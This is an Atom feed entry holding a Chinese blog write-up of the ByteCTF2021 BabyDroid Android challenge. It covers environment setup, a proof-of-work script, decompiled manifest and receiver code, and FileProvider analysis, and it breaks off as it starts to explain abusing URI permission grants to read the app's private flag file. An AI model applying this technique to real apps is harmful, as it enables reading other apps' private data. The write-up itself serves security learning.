<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Matriy&#39;s blog</title>
  
  
  <link href="http://matriy330.github.io/atom.xml" rel="self"/>
  
  <link href="http://matriy330.github.io/"/>
  <updated>2026-01-20T11:40:48.340Z</updated>
  <id>http://matriy330.github.io/</id>
  
  <author>
    <name>Matriy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ByteCTF2021 BabyDroid复现</title>
    <link href="http://matriy330.github.io/27338605/"/>
    <id>http://matriy330.github.io/27338605/</id>
    <published>2026-01-17T05:38:37.000Z</published>
    <updated>2026-01-20T11:40:48.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-BabyDroid复现"><a href="#ByteCTF2021-BabyDroid复现" class="headerlink" title="ByteCTF2021 BabyDroid复现"></a>ByteCTF2021 BabyDroid复现</h1><p>直接参考<a href="https://blog.lleavesg.top/article/ByteCTF-2021-BabyDroid#f13f4051d167405c98dd996efc97e377">ByteCTF2021 BabyDroid复现 | LLeaves Blog</a></p><p>还真没做过这样的题，首先环境就搞了半天</p><h2 id="Docker环境配置-失败"><a href="#Docker环境配置-失败" class="headerlink" title="Docker环境配置(失败)"></a>Docker环境配置(失败)</h2><blockquote><p>PS：最后还是没跑起来</p></blockquote><p>附件地址：<a href="https://ctf.lanzoui.com/b02cjfxtg">ByteCTF</a></p><p>复现环境说明：<a href="https://my.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg">ByteCTF2021 writeup for Android challenges - 飞书云文档</a></p><p>下载下来后可以看到Dockerfile等文件</p><p>你需要一台云服务器(因为在部署时，需要&#x2F;dev&#x2F;kvm)</p><blockquote><p><strong>容器里要跑 Android emulator，需要宿主机提供 KVM</strong>。<strong>虚拟机里还不能再开 KVM（嵌套虚拟化）</strong></p></blockquote><p>一般物理机比较稳</p><p>将内容传至服务器后，给run.sh权限</p><p>然后修改Dockerfile需要修改几个地方</p><p>①</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RUN set -e -x; \</span><br><span class="line">        yes | sdkmanager --install \</span><br><span class="line">                &quot;cmdline-tools;latest&quot; \</span><br><span class="line">                &quot;platform-tools&quot; \</span><br><span class="line">                &quot;build-tools;30.0.0&quot; \</span><br><span class="line">                &quot;platforms;android-30&quot; \</span><br><span class="line">                &quot;system-images;android-30;google_apis;x86_64&quot; \</span><br><span class="line">                &quot;emulator&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RUN set -e -x; \</span><br><span class="line">        yes | SKIP_JDK_VERSION_CHECK=1 sdkmanager --install \</span><br><span class="line">                &quot;cmdline-tools;latest&quot; \</span><br><span class="line">                &quot;platform-tools&quot; \</span><br><span class="line">                &quot;build-tools;30.0.0&quot; \</span><br><span class="line">                &quot;platforms;android-30&quot; \</span><br><span class="line">                &quot;system-images;android-30;google_apis;x86_64&quot; \</span><br><span class="line">                &quot;emulator&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>②</p><p>去掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN sdkmanager --update;</span><br></pre></td></tr></table></figure><blockquote><p><strong>老题目 + 新 SDK + 新 Docker &#x3D; 必须做一次兼容修补</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115213729715.png" alt="image-20260115213729715"></p><p>这里还有个提交的输入简单写个脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;c7b1dd&quot;</span></span><br><span class="line">target = <span class="string">&quot;000000&quot;</span></span><br><span class="line">chars = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span>.join(p)</span><br><span class="line">        h = hashlib.sha256((prefix + s).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> h.startswith(target):</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">            <span class="keyword">raise</span> SystemExit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115214100069.png" alt="image-20260115214100069"></p><p>正确即可输入apk，URL</p><p>这个题目的逻辑不是传统意义的CTF解题</p><p>比赛方提供环境，环境内运行APK，我们需要用APK研究漏洞，编写出自己的APK去攻击利用，得到flag，因此复现时部署环境需要用kvm</p><p>坑点，里面还有端口的问题，也就是说即使你能跑起来这个docker也会遇上端口不对齐的问题，就算对齐了，也跑不起来</p><p>还要修复jdk版本不对，文件里的是jdk11，现在需要使用jdk17了，修复后仍然跑不起来力竭了</p><p>可以看看<a href="https://xz.aliyun.com/news/16393">Android Security学习之ByteCTF2021_mobile 环境搭建+前两道题Writeup-先知社区</a></p><p>但是多半也是跑不起来的</p><h2 id="模拟器环境搭建"><a href="#模拟器环境搭建" class="headerlink" title="模拟器环境搭建"></a>模拟器环境搭建</h2><p>可以先看后面的分析再来搭环境</p><p>manifest文件将Flagreceiver设置为exported为false和设置了intent-filter，防止外界app进行干扰</p><p>如何将flag传递给FlagReceiver？</p><p>有root就行</p><p>参考博客：[<a href="https://bbs.kanxue.com/thread-275379-1.htm#msg_header_h1_2">原创]ByteCTF2022 mobile系列-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am broadcast -W -a &quot;com.wuhengctf.SET_FLAG&quot; -n &quot;com.bytectf.babydroid/.FlagReceiver&quot; -e &#x27;flag&#x27; &#x27;flag&#123;eeeeeeee&#125;&#x27;</span><br></pre></td></tr></table></figure><p>我们可以用Android Studio的模拟器，选择Android 11</p><table><thead><tr><th>Android 版本</th><th>API</th><th>代号</th></tr></thead><tbody><tr><td>Android 15&#x2F;16 (Preview)</td><td>36</td><td>（内部名）</td></tr><tr><td>Android 14</td><td>34 &#x2F; 35</td><td><strong>UpsideDownCake</strong></td></tr><tr><td>Android 13</td><td>33</td><td><strong>Tiramisu</strong></td></tr><tr><td>Android 12L</td><td>32</td><td>Snow Cone v2</td></tr><tr><td>Android 12</td><td>31</td><td>Snow Cone</td></tr><tr><td>Android 11</td><td>30</td><td>Red Velvet Cake</td></tr><tr><td>Android 10</td><td>29</td><td>Q</td></tr><tr><td>Android 9</td><td>28</td><td>Pie</td></tr><tr><td><strong>Android 8.1</strong></td><td><strong>27</strong></td><td><strong>Oreo</strong></td></tr><tr><td>Android 8.0</td><td>26</td><td>Oreo</td></tr><tr><td>Android 7.x</td><td>24–25</td><td>Nougat</td></tr><tr><td>Android 6.0</td><td>23</td><td>Marshmallow</td></tr><tr><td>Android 5.x</td><td>21–22</td><td>Lollipop</td></tr><tr><td>Android 4.4</td><td>19</td><td>KitKat</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.bytectf.babydroid/.MainActivity</span><br></pre></td></tr></table></figure><p>启动安装的app</p><img src="C:\Users\Matriy\AppData\Roaming\Typora\typora-user-images\image-20260120171509288.png" alt="image-20260120171509288" style="zoom:50%;" /><p>广播完可以看到flag了</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260120191621596.png" alt="image-20260120191621596"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260120193527555.png" alt="image-20260120193527555"></p><h2 id="APP分析"><a href="#APP分析" class="headerlink" title="APP分析"></a>APP分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.babydroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Babydroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.TEST&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;action android:name=&quot;com.bytectf.TEST&quot;/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>任何 App 都可以用 action <code>com.bytectf.TEST</code> 启动 Vulnerable</p></blockquote><p><code>receiver</code> 对应的是 Android 的 <strong>BroadcastReceiver 组件</strong>。</p><p>在系统层面：</p><blockquote><p><strong>BroadcastReceiver 是一种“被动组件”</strong></p><p>它不会自己运行，只会在<strong>收到匹配的广播 Intent 时被唤醒</strong></p></blockquote><p><code>intent-filter</code> 是一个 <strong>匹配规则</strong>，告诉 Android哪些 Intent 能匹配到我这个组件</p><blockquote><p><strong>Intent 是 Android 里请求做一件事的消息对象。</strong>一个我想干什么的声明，由系统帮你找谁来干</p></blockquote><p>Android 为什么需要 Intent？因为 Android 有一个<strong>根本设计目标</strong>：</p><blockquote><p><strong>App 之间不能直接互相调用代码（沙箱隔离）。</strong></p></blockquote><p>当一个 Intent 被发出时，系统会做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for 每一个已注册组件:</span><br><span class="line">    if intent-filter 能匹配 Intent:</span><br><span class="line">        加入候选列表</span><br></pre></td></tr></table></figure><table><thead><tr><th>Intent 字段</th><th>intent-filter 中是否声明</th><th>是否必须</th></tr></thead><tbody><tr><td>action</td><td>必须匹配</td><td>必须</td></tr><tr><td>category</td><td>Intent 里的每个都要被 filter 包含</td><td>有则必须</td></tr><tr><td>data</td><td>scheme&#x2F;host&#x2F;path 匹配</td><td>有则必须</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:exported=&quot;false&quot;</span><br></pre></td></tr></table></figure><p>这告诉系统：只有同一个 App 或系统进程，才能用这个 Intent 命中</p><p>这里可能有点懵，先看后面</p><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没啥</p><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><p>这段代码 <strong>不会自己运行</strong>，只会在 <strong>Android 系统调用它时</strong>运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有人 sendBroadcast(Intent)</span><br><span class="line">↓</span><br><span class="line">Intent 的 action 命中 FlagReceiver 的 intent-filter</span><br><span class="line">↓</span><br><span class="line">系统调用 onReceive()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.getFilesDir() 在 Android 上，必然返回：</span><br><span class="line">/data/data/&lt;应用包名&gt;/files</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><p>肯定会写到这个路径</p><h3 id="FileProvider"><a href="#FileProvider" class="headerlink" title="FileProvider"></a><strong>FileProvider</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider android:name=&quot;androidx.core.content.FileProvider&quot; android:exported=&quot;false&quot; android:authorities=&quot;androidx.core.content.FileProvider&quot; android:grantUriPermissions=&quot;true&quot;&gt;</span><br><span class="line">    &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot;/&gt;</span><br><span class="line">&lt;/provider&gt;</span><br></pre></td></tr></table></figure><p><code>FileProvider</code> 是 Android 官方提供的“安全文件中转器”，用来把 App 私有文件，安全地以 <code>content://</code> 形式分享给别人。</p><p>早期 Android，App 想把文件给别的 App，只能用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>FileProvider 的设计目的</p><blockquote><p><strong>不暴露真实路径，只给一个“受控的虚拟 URI”。</strong></p></blockquote><p>所以 FileProvider 做了三件事：</p><ol><li>把私有文件映射成 <code>content://</code> URI</li><li>控制 <strong>哪些路径可以被映射</strong></li><li>控制 <strong>哪些 App 可以临时访问</strong></li></ol><p>exported&#x3D;false 外部 App 不能直接访问这个 provider，不能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://androidx.core.content.FileProvider/...</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">    android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot;</span><br><span class="line">    android:resource=&quot;@xml/file_paths&quot;/&gt;</span><br></pre></td></tr></table></figure><p>xml&#x2F;file_paths有路径</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115224738520.png" alt="image-20260115224738520"></p><table><thead><tr><th>子节点</th><th>含义</th></tr></thead><tbody><tr><td><strong>root-path</strong></td><td>代表设备的根目录 &#x2F;</td></tr><tr><td><strong>files-path</strong></td><td>代表 APP 内部存储空间私有目录下的files 目录，等同于 Context.getFilesDir()所获取的目录路径</td></tr><tr><td><strong>cache-path</strong></td><td>代表内部存储的 cache 目录，与 Context.getCacheDir()获取的路径对应</td></tr><tr><td><strong>external-path</strong></td><td>代表外部存储 (sdcard) 的根目录，与 Environment.getExternalStorageDirectory() 获取的路径对应。</td></tr><tr><td><strong>external-files-path</strong></td><td>代表外部存储空间 APP 私有目录下的 files目录，与Context.getExternalFilesDir(null)获取的路径对应</td></tr><tr><td><strong>external-cache-path</strong></td><td>外部存储空间 APP 私有目录下的 cache目录，等同于Context.getExternalCacheDir()</td></tr><tr><td><strong>external-media-path</strong></td><td>代表app 外部存储媒体区域的根目录，与Context.getExternalMediaDirs()获取的路径对应</td></tr></tbody></table><p>意思是：只允许分享 <code>getFilesDir()</code> 目录下的文件</p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115223803430.png" alt="image-20260115223803430" style="zoom:50%;" /><p><code>/data/data/.../files/flag</code>： <strong>保险箱里真正的文件</strong></p><p>FileProvider：<strong>可以临时发一张“取件码&#x2F;通行证”给别人</strong></p><p>别人凭这个码（<code>content://...</code>）去拿你允许的那份文件</p><table><thead><tr><th><strong>android:name</strong></th><th>Android 提供的 FileProvider的实现类</th></tr></thead><tbody><tr><td><strong>android:exported</strong></td><td>建议指定为 **<code>false</code>**，表示该 FileProvider 只能本应用使用，不是 <code>public</code>的</td></tr><tr><td><strong>android:authorities</strong></td><td>相当于一个用于认证的暗号，在分享文件生成 Uri 时，会通过它的值生成对应的 Uri，该值是一个域名，一般格式为 packagename.fileprovider</td></tr><tr><td><strong>android:grantUriPermissions</strong></td><td>值为**<code>true</code>**，表示允许赋予临时权限，即设置为共享</td></tr><tr><td><strong>meta-data</strong></td><td>指定配置共享目录的配置文件</td></tr></tbody></table><blockquote><p>来自LLeaves</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Intent 本身不能绕过权限，但携带了 URI 授权的 Intent可以把对某一个具体文件&#x2F;数据的访问权临时转交给别人</p><p>Intent 是如何提供对内容提供程序的间接访问的?</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://com.xxx.provider/images/123</span><br></pre></td></tr></table></figure><p>这是一个具体到单条资源的 URI</p><p>拥有权限的 App 构造 Intent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">i.setData(uri);</span><br><span class="line">i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:grantUriPermission=&quot;true&quot;&gt;</span><br></pre></td></tr></table></figure><p>意思是：可以通过 Intent 临时把某个 URI 的访问权授予别人</p><p>如果（且仅如果）被攻击 App 主动通过 Intent 把某个 <code>content://</code> URI 发给攻击者，并且在这个 Intent 上授予了 URI 